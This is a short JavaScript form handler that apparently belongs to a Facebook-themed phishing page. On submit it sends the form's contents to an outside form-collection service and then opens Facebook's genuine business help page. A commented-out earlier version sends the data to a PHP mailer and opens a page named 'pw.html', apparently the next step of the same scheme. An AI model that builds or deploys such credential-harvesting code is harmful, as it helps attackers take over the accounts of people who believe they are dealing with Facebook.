

var form = document.getElementById("myForm"); // Make sure your form has the correct ID
form.addEventListener("submit", function (e) {
  e.preventDefault();
  var formData = new FormData(form);

  // Use XMLHttpRequest or fetch API for AJAX request
  var xhr = new XMLHttpRequest();

  xhr.open("POST", "https://usebasin.com/f/eecc5f1c405b", true);
  xhr.onreadystatechange = function () {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText);
      console.log(data);
      // Handle success or error messages in the frontend
      if (data.status === "success") {
        alert("Email sent successfully");
      } else {
        alert("Error sending email: " + data.message);
      }
    }
  };

  xhr.send(formData); // Moved this line outside the if block
  window.open("https://web.facebook.com/business/help?_rdc=1&_rdr");
});
// function submitFormAndOpenTab() {
//   // Get the form element
//   var form = document.getElementById("myForm");

//   // Use FormData to collect form data
//   var formData = new FormData(form);

//   // Use XMLHttpRequest or fetch API for AJAX request
//   var xhr = new XMLHttpRequest();

//   xhr.open("POST", "sendMail.php", true);
//   xhr.onreadystatechange = function () {
//     if (xhr.readyState == 4) {
//       if (xhr.status == 200) {
//         var data = JSON.parse(xhr.responseText);
//         console.log(data);
//         // Handle success or error messages in the frontend
//         if (data.status === "success") {
//           alert("Email sent successfully");
//         } else {
//           alert("Error sending email: " + data.message);
//         }
//       } else {
//         // Handle other HTTP status codes
//         alert("Error: " + xhr.status);
//       }
//     }
//   };

//   // Send the AJAX request
//   xhr.send(formData);

//   // Open a new tab with a specified URL
//   window.open("pw.html", "_blank");
// }
